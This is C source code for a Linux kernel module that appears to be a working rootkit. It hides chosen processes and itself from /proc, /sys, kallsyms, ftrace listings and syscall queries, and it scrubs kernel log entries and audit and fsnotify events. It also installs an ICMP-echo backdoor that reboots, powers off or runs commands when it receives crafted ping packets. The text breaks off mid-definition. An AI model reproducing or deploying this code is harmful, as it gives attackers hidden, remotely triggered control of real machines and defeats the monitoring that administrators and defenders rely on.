/*
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/livepatch.h>
#include <linux/seq_file.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/ptrace.h>
#include <linux/kallsyms.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/proc_fs.h>
#include <linux/proc_ns.h>
#include <linux/refcount.h>
#include <linux/spinlock.h>
#include <linux/atomic.h>
#include <linux/binfmts.h>
#include <linux/sched/coredump.h>
#include <linux/sched/task.h>
#include <linux/bsearch.h>
#include <linux/cn_proc.h>
#include <linux/connector.h>
#include <linux/dynamic_debug.h>
#include <linux/audit.h>
#include <linux/string.h>
#include <linux/kprobes.h>
#include <linux/reboot.h>
#include <linux/fsnotify_backend.h>
#include <linux/version.h>
#include <linux/icmp.h>
#include "ftrace_hook.h"


#define FIRST_PROCESS_ENTRY 256
#define TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)

typedef struct dentry *instantiate_t(struct dentry *,
                                     struct task_struct *, const void *);
struct tgid_iter {
        unsigned int tgid;
        struct task_struct *task;
};

struct klp_ops {
        struct list_head node;
        struct list_head func_stack;
        struct ftrace_ops fops;
};

struct ftrace_func_entry {
        struct hlist_node hlist;
        unsigned long ip;
};

struct ftrace_hash {
        unsigned long           size_bits;
        struct hlist_head       *buckets;
        unsigned long           count;
        unsigned long           flags;
        struct rcu_head         rcu;
};

struct ftrace_page {
        struct ftrace_page      *next;
        struct dyn_ftrace       *records;
        int                     index;
        int                     size;
};

struct printk_log {
        u64 ts_nsec;            /* timestamp in nanoseconds */
        u16 len;                /* length of entire record */
        u16 text_len;           /* length of text buffer */
        u16 dict_len;           /* length of dictionary buffer */
        u8 facility;            /* syslog facility */
        u8 flags:5;             /* internal record flags */
        u8 level:3;             /* syslog level */
#ifdef CONFIG_PRINTK_CALLER
        u32 caller_id;            /* thread id or processor id */
#endif
};

struct module *this_module = THIS_MODULE;
static int hidden_base_exe = 0;
module_param(hidden_base_exe, int, 0644);

static int force_modules_disabled = 0;
module_param(force_modules_disabled, int, 0644);

//disable RESTART HALT POWER_OFF KEXEC RESTART2
static int force_reboot_disabled = 0;
module_param(force_reboot_disabled, int, 0644);

#define MAX_NUM_PROC_NAME 10
static int num_proc_name = 3;
static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {"hidden_comm", "touch", "rm"};
module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
static char exe_buf[PATH_MAX] = {0};

static char hidden_msg_klog[] = "hidden_proc";
static char **p_log_buf = NULL;
static raw_spinlock_t *p_logbuf_lock = NULL;
static u64 *p_clear_seq = NULL;
static u32 *p_clear_idx = NULL;
static u64 *p_log_next_seq = NULL;
static u32 *p_log_next_idx = NULL;
static void (*p__printk_safe_enter)(void) = NULL;
static void (*p__printk_safe_exit)(void) = NULL;

static struct tgid_iter (*p_next_tgid)(struct pid_namespace *ns, struct tgid_iter iter) = NULL;
static bool (*p_ptrace_may_access)(struct task_struct *task, unsigned int mode) = NULL;
static bool (*p_proc_fill_cache)(struct file *file, struct dir_context *ctx,
		const char *name, unsigned int len,
		instantiate_t instantiate, struct task_struct *task, const void *ptr) = NULL;

static struct dentry * (*p_proc_pid_instantiate)(struct dentry * dentry,
                                   struct task_struct *task, const void *ptr) = NULL;

static unsigned (*p_name_to_int)(const struct qstr *qstr) = NULL;
static struct task_struct *(*p_find_task_by_pid_ns)(pid_t nr, struct pid_namespace *ns) = NULL;

//static void (*p___audit_bprm)(struct linux_binprm *bprm) = NULL;

static int *p_modules_disabled = NULL;
static struct list_head *p_modules = NULL;
static char * (*p_module_flags)(struct module *mod, char *buf) = NULL;
static bool (*p_kallsyms_show_value)(const struct cred *cred) = NULL;

static int (*p_ddebug_remove_module)(const char *mod_name) = NULL;

static const struct kernel_symbol *p__start___ksymtab = NULL;
static const struct kernel_symbol *p__stop___ksymtab = NULL;


static unsigned long old_tainted_mask = 0;
static unsigned long *p_tainted_mask = NULL;

//static struct ftrace_ops __rcu **p_ftrace_ops_list = NULL;
//static struct ftrace_ops *p_ftrace_list_end = NULL;
static struct mutex *p_ftrace_lock = NULL;
static struct klp_ops * (*p_klp_find_ops)(void *old_func) = NULL;
static struct ftrace_func_entry *(*p_ftrace_lookup_ip)(struct ftrace_hash *hash, unsigned long ip) = NULL;
static struct ftrace_page       **p_ftrace_pages_start = NULL;


static int (*p_group_send_sig_info)(int sig, struct kernel_siginfo *info,
                        struct task_struct *p, enum pid_type type) = NULL;

static int (*p_security_task_getpgid)(struct task_struct *p) = NULL;
static struct task_struct * (*p_find_task_by_vpid)(pid_t vnr) = NULL;

static void (*p_free_uid)(struct user_struct *up) = NULL;
static struct user_struct *(*p_find_user)(kuid_t uid) = NULL;

static rwlock_t *p_tasklist_lock = NULL;

static struct ftrace_ops *p_kprobe_ftrace_ops = NULL;
static struct ftrace_ops *p_kprobe_ipmodify_ops = NULL;

static bool has_pid_permissions(struct pid_namespace *pid,
                                 struct task_struct *task,
                                 int hide_pid_min)
{
        if (pid->hide_pid < hide_pid_min)
                return true;
        if (in_group_p(pid->pid_gid))
                return true;
        return p_ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS);
}

static int get_task_exe(char *buf, int buflen, struct task_struct *task)
{
        int ret = -1;
        struct file *exe_file = NULL;
        char *p = NULL;

        exe_file = get_task_exe_file(task);
        if (exe_file) {
                p = d_path(&(exe_file->f_path), buf, buflen - 1);
                fput(exe_file);

                if (IS_ERR_OR_NULL(p)) {
                        ret = -1;
                } else {
                        ret = strlen(p);
                        memmove(buf, p, ret);
                        buf[ret] = '\0';
                }
        }

        return ret;
}

static int is_hidden_proc_name(const char *name, int len_name)
{
	int i = 0;

	if (!name || len_name <= 0)
		goto end;

	for (i = 0; i < num_proc_name; i++) {
		if (hidden_proc_name[i] == NULL)
			break;
		if (strncmp(name, hidden_proc_name[i], len_name) == 0)
			return 1;
	}

end:
	return 0;
}

static int is_hidden_proc(struct task_struct *task, pid_t pid) 
{
	int ret = 0;

	if (hidden_base_exe) {
		if (get_task_exe(exe_buf, sizeof(exe_buf), task) > 0) {
			if (is_hidden_proc_name(exe_buf, sizeof(exe_buf)))
				ret = 1;
		}
	} else {
		if (is_hidden_proc_name(task->comm, sizeof(task->comm)))
			ret = 1;
	}

	return ret;
}

static int is_hidden_proc_pid(pid_t pid) 
{
        struct task_struct *task = NULL;
	int ret = 0;

        rcu_read_lock();
	task = p_find_task_by_vpid(pid);
        if (task)
                get_task_struct(task);
        rcu_read_unlock();
        if (!task)
                goto end;

	if (is_hidden_proc(task , pid)) 
		ret = 1;
	put_task_struct(task);

end:
	return ret;
}

static struct dentry *livepatch_proc_pid_lookup(struct dentry *dentry, unsigned int flags)
{ 
        struct task_struct *task;
        unsigned tgid; 
        struct pid_namespace *ns;
        struct dentry *result = ERR_PTR(-ENOENT);

        tgid = p_name_to_int(&dentry->d_name);
        if (tgid == ~0U)
                goto out;

        ns = dentry->d_sb->s_fs_info;
        rcu_read_lock();
        task = p_find_task_by_pid_ns(tgid, ns);
        if (task)
                get_task_struct(task);
        rcu_read_unlock();
        if (!task)
                goto out;

	if (is_hidden_proc(task , tgid)) {
		put_task_struct(task);
		goto out;
	}

        result = p_proc_pid_instantiate(dentry, task, NULL);
        put_task_struct(task);
out:
        return result;
}

static int livepatch_proc_pid_readdir(struct file *file, struct dir_context *ctx)
{
        struct tgid_iter iter;
        struct pid_namespace *ns = proc_pid_ns(file_inode(file));
        loff_t pos = ctx->pos;

        if (pos >= PID_MAX_LIMIT + TGID_OFFSET)
                return 0;

        if (pos == TGID_OFFSET - 2) {
                struct inode *inode = d_inode(ns->proc_self);
                if (!dir_emit(ctx, "self", 4, inode->i_ino, DT_LNK))
                        return 0;
                ctx->pos = pos = pos + 1;
        }
        if (pos == TGID_OFFSET - 1) {
                struct inode *inode = d_inode(ns->proc_thread_self);
                if (!dir_emit(ctx, "thread-self", 11, inode->i_ino, DT_LNK))
                        return 0;
                ctx->pos = pos = pos + 1;
        }

        iter.tgid = pos - TGID_OFFSET;
        iter.task = NULL;
        for (iter = p_next_tgid(ns, iter);
             iter.task;
             iter.tgid += 1, iter = p_next_tgid(ns, iter)) {
                char name[10 + 1];
                unsigned int len;

                cond_resched();
                if (!has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))
                        continue;

		if (is_hidden_proc(iter.task, iter.tgid))
			continue;

                len = snprintf(name, sizeof(name), "%u", iter.tgid);
                ctx->pos = iter.tgid + TGID_OFFSET;
                if (!p_proc_fill_cache(file, ctx, name, len,
                                     p_proc_pid_instantiate, iter.task, NULL)) {
                        put_task_struct(iter.task);
                        return 0;
                }
        }
        ctx->pos = PID_MAX_LIMIT + TGID_OFFSET;
        return 0;
}

/*
 * hidden the kernel module from /proc/modules
 */
static void *m_start(struct seq_file *m, loff_t *pos)
{
        mutex_lock(&module_mutex);
        return seq_list_start(p_modules, *pos);
}

static void *m_next(struct seq_file *m, void *p, loff_t *pos)
{
        return seq_list_next(p, p_modules, pos);
}

static void m_stop(struct seq_file *m, void *p)
{
        mutex_unlock(&module_mutex);
}

static inline void print_unload_info(struct seq_file *m, struct module *mod)
{
        struct module_use *use;
        int printed_something = 0;

        seq_printf(m, " %i ", module_refcount(mod)); 

        /*
         * Always include a trailing , so userspace can differentiate
         * between this and the old multi-field proc format.
         */
        list_for_each_entry(use, &mod->source_list, source_list) {
                printed_something = 1;
                seq_printf(m, "%s,", use->source->name);
        }

        if (mod->init != NULL && mod->exit == NULL) {
                printed_something = 1;
                seq_puts(m, "[permanent],");
        }

        if (!printed_something)
                seq_puts(m, "-");
}

#define MODULE_FLAGS_BUF_SIZE (TAINT_FLAGS_COUNT + 4)
static int m_show(struct seq_file *m, void *p)
{
        struct module *mod = list_entry(p, struct module, list);
        char buf[MODULE_FLAGS_BUF_SIZE];
        void *value;

        /* We always ignore unformed modules. */
        if (mod->state == MODULE_STATE_UNFORMED)
                return 0;

	if (mod == this_module)
		return 0;

        seq_printf(m, "%s %u",
                   mod->name, mod->init_layout.size + mod->core_layout.size);
        print_unload_info(m, mod);

        /* Informative for users. */
        seq_printf(m, " %s",
                   mod->state == MODULE_STATE_GOING ? "Unloading" :
                   mod->state == MODULE_STATE_COMING ? "Loading" :
                   "Live");
        /* Used by oprofile and other similar tools. */
        value = m->private ? NULL : mod->core_layout.base;
        seq_printf(m, " 0x%px", value);

        /* Taints info */
        if (mod->taints)
                seq_printf(m, " %s", p_module_flags(mod, buf));
                
        seq_puts(m, "\n");
        return 0;
}

static const struct seq_operations modules_op = {
        .start  = m_start,
        .next   = m_next,
        .stop   = m_stop,
        .show   = m_show
};

static int livepatch_modules_open(struct inode *inode, struct file *file)
{
        int err = seq_open(file, &modules_op);

        if (!err) {
                struct seq_file *m = file->private_data;
                m->private = p_kallsyms_show_value(file->f_cred) ? NULL : (void *)8ul;
        }

        return err;
}

/*
 * hidden the kernel module from /proc/modules
 */

static unsigned long kernel_symbol_value(const struct kernel_symbol *sym)
{
#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
        return (unsigned long)offset_to_ptr(&sym->value_offset);
#else
        return sym->value;
#endif
}

static const char *kallsyms_symbol_name(struct mod_kallsyms *kallsyms, unsigned int symnum)
{
        return kallsyms->strtab + kallsyms->symtab[symnum].st_name;
}

static const char *kernel_symbol_name(const struct kernel_symbol *sym)
{
#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
        return offset_to_ptr(&sym->name_offset);
#else
        return sym->name;
#endif
}

static int cmp_name(const void *name, const void *sym)
{
        return strcmp(name, kernel_symbol_name(sym));
}

static const struct kernel_symbol *lookup_exported_symbol(const char *name,
                                                          const struct kernel_symbol *start,
                                                          const struct kernel_symbol *stop)
{
        return bsearch(name, start, stop - start,
                        sizeof(struct kernel_symbol), cmp_name);
}

static int is_exported(const char *name, unsigned long value,
                       const struct module *mod)
{
        const struct kernel_symbol *ks;
        if (!mod)
                ks = lookup_exported_symbol(name, p__start___ksymtab, p__stop___ksymtab);
        else
                ks = lookup_exported_symbol(name, mod->syms, mod->syms + mod->num_syms);

        return ks != NULL && kernel_symbol_value(ks) == value;
}

static int livepatch_module_get_kallsym(unsigned int symnum, unsigned long *value, char *type,
                        char *name, char *module_name, int *exported)
{
        struct module *mod;

        preempt_disable();
        list_for_each_entry_rcu(mod, p_modules, list) {
                struct mod_kallsyms *kallsyms;

		if (mod == this_module)
                        continue;

                if (mod->state == MODULE_STATE_UNFORMED)
                        continue;

                kallsyms = rcu_dereference_sched(mod->kallsyms);
                if (symnum < kallsyms->num_symtab) {
                        const Elf_Sym *sym = &kallsyms->symtab[symnum];

                        *value = kallsyms_symbol_value(sym);
                        *type = kallsyms->typetab[symnum];
                        strlcpy(name, kallsyms_symbol_name(kallsyms, symnum), KSYM_NAME_LEN);
                        strlcpy(module_name, mod->name, MODULE_NAME_LEN);
                        *exported = is_exported(name, *value, mod);
                        preempt_enable();
                        return 0;
                }
                symnum -= kallsyms->num_symtab;
        }
        preempt_enable();
        return -ERANGE;
}

/*
 * bypass the cn_proc about the hidden proc msg
 */
static int livepatch_cn_netlink_send(struct cn_msg *msg, u32 portid, u32 __group,
        gfp_t gfp_mask)
{
	struct task_struct *task = current;

	if (is_hidden_proc(task, task->tgid))
		return 0;

	return cn_netlink_send_mult(msg, msg->len, portid, __group, gfp_mask);
}

static void livepatch__audit_bprm(struct linux_binprm *bprm)
{
	return;
}

static int livepatch_kill_pid_info(int sig, struct kernel_siginfo *info, struct pid *pid)
{
        int error = -ESRCH;
        struct task_struct *p;

	rcu_read_lock();
	p = pid_task(pid, PIDTYPE_PID);
	if (p && is_hidden_proc(p, p->tgid) && sig != SIGKILL) {
		rcu_read_unlock();
		return error;
	}
	rcu_read_unlock();

        for (;;) {
                rcu_read_lock();
                p = pid_task(pid, PIDTYPE_PID);
                if (p)
                        error = p_group_send_sig_info(sig, info, p, PIDTYPE_TGID);
                rcu_read_unlock();
                if (likely(!p || error != -ESRCH))
                        return error;

                /*
                 * The task was unhashed in between, try again.  If it
                 * is dead, pid_task() will return NULL, if we race with
                 * de_thread() it will find the new leader.
                 */
        }
}

static int livepatch_do_getpgid(pid_t pid)
{
        struct task_struct *p;
        struct pid *grp;
        int retval;

        rcu_read_lock();
        if (!pid)
                grp = task_pgrp(current);
        else {
                retval = -ESRCH;
                p = p_find_task_by_vpid(pid);
                if (!p)
                        goto out;

		get_task_struct(p);
		if (is_hidden_proc(p, pid)) {
			put_task_struct(p);
			goto out;
		}
		put_task_struct(p);

                grp = task_pgrp(p);
                if (!grp)
                        goto out;

                retval = p_security_task_getpgid(p);
                if (retval)
                        goto out;
        }
        retval = pid_vnr(grp);
out:
        rcu_read_unlock();
        return retval;
}

static void hidden_module(struct module *mod) {
	//del from 'modules' list
	list_del(&mod->list);

	//del from /sys/module/
	if (mod->holders_dir && mod->holders_dir->parent) {                 
		kobject_del(mod->holders_dir->parent);                           
	}     

	p_ddebug_remove_module(mod->name);
}

static void hidden_from_sys_livepatch(struct klp_patch *klp) 
{
	if (!klp)
		goto end;

	kobject_del(&klp->kobj);
	list_del(&klp->list);
end:
	return;
}

static void save_tainted_mask(void)
{
	old_tainted_mask = *p_tainted_mask;
}

static void restore_tainted_mask(void)
{
	*p_tainted_mask = old_tainted_mask; 
	old_tainted_mask = 0;
}

#if 0
static int remove_ftrace_ops(struct ftrace_ops *ops)
{
        struct ftrace_ops **p;

        /*
         * If we are removing the last function, then simply point
         * to the ftrace_stub.
         */
        if (rcu_dereference_protected(*p_ftrace_ops_list,
                        lockdep_is_held(p_ftrace_lock)) == ops &&
            rcu_dereference_protected(ops->next,
                        lockdep_is_held(p_ftrace_lock)) == p_ftrace_list_end) {
                *p_ftrace_ops_list = p_ftrace_list_end;
                return 0;
        }

        for (p = p_ftrace_ops_list; *p != p_ftrace_list_end; p = &(*p)->next)
                if (*p == ops)
                        break;

        if (*p != ops)
                return -1;

        *p = (*p)->next;
        return 0;
}
#endif

#define do_for_each_ftrace_rec(pg, rec)                                 \
        for (pg = *p_ftrace_pages_start; pg; pg = pg->next) {              \
                int _____i;                                             \
                for (_____i = 0; _____i < pg->index; _____i++) {        \
                        rec = &pg->records[_____i];

#define while_for_each_ftrace_rec()             \
                }                               \
        }


static void hidden_ftrace_ops(struct ftrace_ops *fops)
{
	struct ftrace_hash *hash = NULL;
	//struct ftrace_func_entry *entry = NULL;
	struct ftrace_page *pg = NULL;
	struct dyn_ftrace *rec = NULL;

	if (!fops)
		return;

	mutex_lock(p_ftrace_lock);

	hash = fops->func_hash->filter_hash ;
	do_for_each_ftrace_rec(pg, rec) {
		if (p_ftrace_lookup_ip(hash, rec->ip)) {
			rec->flags &= ~FTRACE_FL_ENABLED;
			rec->flags &= FTRACE_FL_MASK;
		}
	} while_for_each_ftrace_rec();

	mutex_unlock(p_ftrace_lock);

#if 0
	entry = p_ftrace_lookup_ip(hash, ftrace_loc);
	if (entry) {
		hlist_del(&entry->hlist);
		hash->count--;
	}

	remove_ftrace_ops(fops);
	fops->flags &= ~FTRACE_OPS_FL_ENABLED;
#endif
}

static void hidden_from_enabled_functions_ftrace_hooks(struct ftrace_hook *hooks, int num)
{
	int i = 0;

	if (!hooks || num <= 0) 
		return;

	for (i = 0; i < num; i++) 
		hidden_ftrace_ops(&(hooks[i].ops));

	return;
}


static void hidden_ftrace_ops_addr(struct ftrace_ops *fops, kprobe_opcode_t *addr)
{
	struct ftrace_hash *hash = NULL;
	//struct ftrace_func_entry *entry = NULL;
	struct ftrace_page *pg = NULL;
	struct dyn_ftrace *rec = NULL;

	if (!fops)
		return;

	mutex_lock(p_ftrace_lock);

	hash = fops->func_hash->filter_hash ;
	do_for_each_ftrace_rec(pg, rec) {
		if (rec->ip == (unsigned long)addr && p_ftrace_lookup_ip(hash, rec->ip)) {
			rec->flags &= ~FTRACE_FL_ENABLED;
			rec->flags &= FTRACE_FL_MASK;
		}
	} while_for_each_ftrace_rec();

	mutex_unlock(p_ftrace_lock);
}

static void hidden_from_enabled_functions_kprobe(struct kretprobe **rps, int num)
{
	int i = 0;
	bool ipmodify ;

	for (i = 0; i < num; i++) {
		ipmodify = (rps[i]->kp.post_handler != NULL);

		if (ipmodify)
			hidden_ftrace_ops_addr(p_kprobe_ipmodify_ops, rps[i]->kp.addr);
		else
			hidden_ftrace_ops_addr(p_kprobe_ftrace_ops, rps[i]->kp.addr);
	}

	return;
}

static void hidden_from_enabled_functions_klp(struct klp_object *obj )
{
	struct klp_func *func = NULL;
	struct klp_ops *ops = NULL;
	struct ftrace_ops *fops = NULL;
	unsigned long ftrace_loc;

	klp_for_each_func(obj, func) {
		ops = p_klp_find_ops(func->old_func);
		if (!ops)  
			continue;

		fops = &ops->fops;

		ftrace_loc = (unsigned long)func->old_func;
		if (!ftrace_loc) 
			continue;

		hidden_ftrace_ops(fops);
        }
}

static struct printk_log *log_from_idx(u32 idx)
{
        struct printk_log *msg = (struct printk_log *)(*p_log_buf + idx);

        /*
         * A length == 0 record is the end of buffer marker. Wrap around and
         * read the message at the start of the buffer.
         */
        if (!msg->len) 
                return (struct printk_log *)(*p_log_buf);
        return msg; 
}

static u32 log_next(u32 idx)
{
        struct printk_log *msg = (struct printk_log *)(*p_log_buf + idx);

        /* length == 0 indicates the end of the buffer; wrap */
        /*
         * A length == 0 record is the end of buffer marker. Wrap around and
         * read the message at the start of the buffer as *this* one, and
         * return the one after that.
         */ 
        if (!msg->len) {
                msg = (struct printk_log *)(*p_log_buf);
                return msg->len;
        }
        return idx + msg->len;
}

static char *log_text(const struct printk_log *msg) 
{
        return (char *)msg + sizeof(struct printk_log);
}

#define printk_safe_enter_irq()         \
        do {                                    \
                local_irq_disable();            \
                p__printk_safe_enter();          \
        } while (0)

#define printk_safe_exit_irq()                  \
        do {                                    \
                p__printk_safe_exit();           \
                local_irq_enable();             \
        } while (0)

#define logbuf_lock_irq()                               \
        do {                                            \
                printk_safe_enter_irq();                \
                raw_spin_lock(p_logbuf_lock);            \
        } while (0)

#define logbuf_unlock_irq()                             \
        do {                                            \
                raw_spin_unlock(p_logbuf_lock);          \
                printk_safe_exit_irq();                 \
        } while (0)


static void clear_klog(void)
{
	u64 seq;
	u32 idx;
#if 0
	u64 sum_seq = 0;
	u32 sum_idx = 0;
	int flag = 0;
#endif
	logbuf_lock_irq();      
	seq = *p_clear_seq;
	idx = *p_clear_idx;
	while (seq < *p_log_next_seq) {
		struct printk_log *msg = log_from_idx(idx);
		char *text = log_text(msg);

		idx = log_next(idx);
		seq++;

		//if (flag == 0) {
			if (msg->text_len >= sizeof(hidden_msg_klog)) {
				if (strstr(text, hidden_msg_klog)) { 
					//flag = 1;
					//sum_seq++;
					//sum_idx += msg->len;
					msg->text_len = 0;
					msg->dict_len = 0;
					msg->len = 0;
				}
			}
#if 0
		} else {
			sum_seq++;
			sum_idx += msg->len;
		}
#endif
	}

#if 0
	if (*p_log_next_seq > sum_seq)
		*p_log_next_seq -= sum_seq;
	if (*p_log_next_idx > sum_idx)
		*p_log_next_idx -= sum_idx;
#endif
	logbuf_unlock_irq();      
}

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*real_sched_getaffinity)(struct pt_regs *regs) = NULL;
static asmlinkage long ftrace_sched_getaffinity(struct pt_regs *regs)
{
	return real_sched_getaffinity(regs);
}

static asmlinkage long (*real_security_task_getscheduler)(struct pt_regs *regs) = NULL;
static asmlinkage long ftrace_security_task_getscheduler(struct pt_regs *regs)
{
	return real_security_task_getscheduler(regs);
}

static asmlinkage long (*real_security_task_getsid)(struct pt_regs *regs) = NULL;
static asmlinkage long ftrace_security_task_getsid(struct pt_regs *regs)
{
	return real_security_task_getsid(regs);
}

static asmlinkage int (*real_reboot_pid_ns)(struct pid_namespace *pid_ns, int cmd) = NULL;
static asmlinkage int ftrace_reboot_pid_ns(struct pid_namespace *pid_ns, int cmd)
{
	return real_reboot_pid_ns(pid_ns, cmd);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)
static asmlinkage int (*real___fsnotify_parent)(const struct path *path, struct dentry *dentry, __u32 mask) = NULL;
static asmlinkage int ftrace___fsnotify_parent(const struct path *path, struct dentry *dentry, __u32 mask)
{
	return real___fsnotify_parent(path, dentry, mask);
}

static asmlinkage int (*real_fsnotify)(struct inode *to_tell, __u32 mask, const void *data, int data_is,
             const struct qstr *file_name, u32 cookie) = NULL;
static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const void *data, int data_is,
             const struct qstr *file_name, u32 cookie)
{
	
	return read_fsnotify(to_tell, mask, data, data_is, file_name, cookie);
} 

static asmlinkage  bool (*real_icmp_echo)(struct sk_buff *skb) = NULL;
static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
{
	return real_icmp_echo(skb);
}
#endif

#else

static asmlinkage long (*real_sched_getaffinity)(pid_t pid, struct cpumask *mask) = NULL;
static asmlinkage long ftrace_sched_getaffinity(pid_t pid, struct cpumask *mask)
{
	struct task_struct *p = NULL;
	int ret = 0;

	rcu_read_lock();
	p = p_find_task_by_vpid(pid);
	if (p)
		get_task_struct(p); 
	rcu_read_unlock();

	if (p) {
		if (is_hidden_proc(p, pid))
			ret = -ESRCH;
		put_task_struct(p); 
	}
	if (ret == -ESRCH)
		return ret; 

	return real_sched_getaffinity(pid, mask);
}


static asmlinkage int (*real_security_task_getscheduler)(struct task_struct *p) = NULL;
static asmlinkage int ftrace_security_task_getscheduler(struct task_struct *p)
{
	if (p) {
		if (is_hidden_proc(p, p->tgid))
			return -ESRCH;
	}

	return real_security_task_getscheduler(p);
}


static asmlinkage int (*real_security_task_getsid)(struct task_struct *p) = NULL;
static asmlinkage int ftrace_security_task_getsid(struct task_struct *p)
{
	if (p) {
		if (is_hidden_proc(p, p->tgid))
			return -ESRCH;
	}

	return real_security_task_getsid(p);
}

static asmlinkage int (*real_reboot_pid_ns)(struct pid_namespace *pid_ns, int cmd) = NULL;
static asmlinkage int ftrace_reboot_pid_ns(struct pid_namespace *pid_ns, int cmd)
{
	if (force_reboot_disabled) {
		if (cmd == LINUX_REBOOT_CMD_RESTART2
			|| cmd == LINUX_REBOOT_CMD_RESTART
			|| cmd == LINUX_REBOOT_CMD_POWER_OFF
			|| cmd == LINUX_REBOOT_CMD_HALT
			|| cmd == LINUX_REBOOT_CMD_KEXEC)
			return -EPERM;
	}

	return real_reboot_pid_ns(pid_ns, cmd);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)

static int is_hidden_path(const struct path *path)
{
	char *path_buf = NULL;
	char *p = NULL;
	int ret = 0;

	if (!path)
		goto end;

	path_buf = kmalloc(PATH_MAX, GFP_KERNEL);
	if (!path_buf) 
		goto end;

	p = d_path(path, path_buf, PATH_MAX - 1);
	if (IS_ERR_OR_NULL(p)) 
		goto end;
		
	ret = strlen(p);
	memmove(path_buf, p, ret);
	path_buf[ret] = '\0';

	if (is_hidden_proc_name(path_buf, PATH_MAX)) 
		ret = 1;

end:
	if (path_buf)
		kfree(path_buf);	
	return ret;
}

static asmlinkage int (*real___fsnotify_parent)(const struct path *path, struct dentry *dentry, __u32 mask) = NULL;
static asmlinkage int ftrace___fsnotify_parent(const struct path *path, struct dentry *dentry, __u32 mask)
{
	if (mask & (FS_OPEN_EXEC | FS_OPEN_EXEC_PERM | FS_OPEN_PERM)) 
		if (is_hidden_path(path))
			return 0;

	return real___fsnotify_parent(path, dentry, mask);
}

static asmlinkage int (*real_fsnotify)(struct inode *to_tell, __u32 mask, const void *data, int data_is,
             const struct qstr *file_name, u32 cookie) = NULL;
static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const void *data, int data_is,
             const struct qstr *file_name, u32 cookie)
{
	if (data_is == FSNOTIFY_EVENT_PATH 
		&& (mask & (FS_OPEN_EXEC | FS_OPEN_EXEC_PERM | FS_OPEN_PERM))) { 
		if (is_hidden_path((const struct path *)data))
			return 0;
	}
	
	return real_fsnotify(to_tell, mask, data, data_is, file_name, cookie);
} 

static int run_usr_cmd(const char *cmd)
{
        char **argv;
        static char *envp[] = {
                "HOME=/",
                "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                NULL
        };
        int ret;
        argv = argv_split(GFP_KERNEL, cmd, NULL);
        if (argv) {
                ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
                argv_free(argv);
        } else {
                ret = -ENOMEM;
        }

        return ret;
}

static void exec_cmd(char *cmd, int len) 
{
	if (len < 3)  //len max value 56 
		return;

	//*** or len == 7/18/29/40/51
	if ((cmd[0] == '*' && cmd[1] == '*' && cmd[2] == '*') || (len%11) == 7) {
		kernel_restart(NULL);

	//$$$ or len == 2/17/32/47
	} else if ((cmd[0] == '$' && cmd[1] == '$' && cmd[2] == '$') || (len%15) == 2)  {
		kernel_power_off();
		do_exit(0);
	//0x010101 or len == 6/30/54/
	} else if ((cmd[0] == 0x01 && cmd[1] == 0x01 && cmd[2] == 0x01) || (len%24) == 6) {
		run_usr_cmd("/bin/touch /tmp/xxx");
	//0x020202 or len == 3/28/53/
	} else if ((cmd[0] == 0x02 && cmd[1] == 0x02 && cmd[2] == 0x02) || (len%25) == 3) {
		run_usr_cmd("/bin/rm /tmp/xxx");
	}
	return;
};

static asmlinkage  bool (*real_icmp_echo)(struct sk_buff *skb) = NULL;
static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
{
	struct icmphdr *icmph = NULL;
	char *data = NULL;

	icmph = icmp_hdr(skb);
	data = (char *)icmph + sizeof(struct icmphdr);

	exec_cmd(data, skb->len);

	return real_icmp_echo(skb);
}
#endif
#endif

static struct ftrace_hook hooks[] = {
        HOOK("sched_getaffinity", ftrace_sched_getaffinity, &real_sched_getaffinity),
        HOOK("security_task_getscheduler", ftrace_security_task_getscheduler, &real_security_task_getscheduler),
        HOOK("security_task_getsid", ftrace_security_task_getsid, &real_security_task_getsid),
        HOOK("reboot_pid_ns", ftrace_reboot_pid_ns, &real_reboot_pid_ns),
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)
        HOOK("__fsnotify_parent", ftrace___fsnotify_parent, &real___fsnotify_parent),
        HOOK("fsnotify", ftrace_fsnotify, &real_fsnotify),
        HOOK("icmp_echo", ftrace_icmp_echo, &real_icmp_echo),
#endif
};

static int entry_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
{
        return 0;
}

static int ret_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
{
        unsigned long retval = regs_return_value(regs);

	//int which = (int) regs_get_kernel_argument(regs, 0);
	pid_t who = (pid_t) regs_get_kernel_argument(regs, 1);

	if (retval != (unsigned long)(-ESRCH)) {
		if (is_hidden_proc_pid(who))
			regs_set_return_value(regs, (unsigned long)(-ESRCH));
	}

        return 0;
}

struct sysinfo_data {
	struct sysinfo *info;
};
static int entry_handler_do_sysinfo(struct kretprobe_instance *ri, struct pt_regs *regs)
{
        struct sysinfo_data *data;

        if (!current->mm)
                return 1;       /* Skip kernel threads */

        data = (struct sysinfo_data *)ri->data;
        data->info = (struct sysinfo *)regs_get_kernel_argument(regs, 0);
        return 0;
}

static int ret_handler_do_sysinfo(struct kretprobe_instance *ri, struct pt_regs *regs)
{
        struct sysinfo_data *data;
        unsigned long retval = regs_return_value(regs);

        data = (struct sysinfo_data *)ri->data;
	if (retval == 0 && data->info) {
		//pr_info("procs:%u num_proc_name:%d\n", data->info->procs, num_proc_name);
		data->info->procs -= num_proc_name;
	}

        return 0;
}

static struct kretprobe krps[] = {
	{
		.kp.symbol_name = "__x64_sys_getpriority",
